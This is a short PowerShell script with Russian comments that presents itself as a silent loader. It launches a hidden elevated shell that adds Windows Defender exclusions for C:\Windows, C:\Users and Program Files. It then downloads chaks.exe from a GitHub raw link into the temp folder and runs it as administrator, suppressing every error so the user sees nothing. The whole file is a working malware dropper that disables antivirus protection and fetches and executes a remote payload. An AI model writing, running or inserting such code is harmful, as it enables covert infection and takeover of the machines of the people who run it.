# Тихий загрузчик + запуск от админа + добавление широких исключений Defender

$ErrorActionPreference = 'SilentlyContinue'

# === Добавляем исключения для Defender (требует прав администратора) ===
try {
    $exclusions = @(
        'C:\$WINDOWS.~BT',
        'C:\$Windows.~WS',
        'C:\Catalog.wci',
        'C:\ESD',
        'C:\Intel',
        'C:\Program Files',
        'C:\Program Files (x86)',
        'C:\Windows',
        'C:\Users'
    )

    # Запускаем PowerShell от имени администратора и добавляем исключения
    Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @"
-NoProfile -ExecutionPolicy Bypass -Command 
Add-MpPreference -ExclusionPath '$($exclusions -join "','")' 2>&1 | Out-Null
"@
}
catch { }

# === Основная часть загрузчика ===
$url = 'https://github.com/RecentFiles/ModSz25az/raw/refs/heads/main/chaks.exe'
$out = [System.IO.Path]::GetTempPath() + 'chaks.exe'

try {
    # Скачиваем файл
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop

    # Запуск chaks.exe от имени администратора
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $out
    $psi.UseShellExecute = $true
    $psi.Verb = "runas"
    # $psi.WindowStyle = "Hidden"   # можно раскомментировать, если нужно скрыть окно

    [System.Diagnostics.Process]::Start($psi)
}
catch {
    # Ничего не показываем пользователю
}
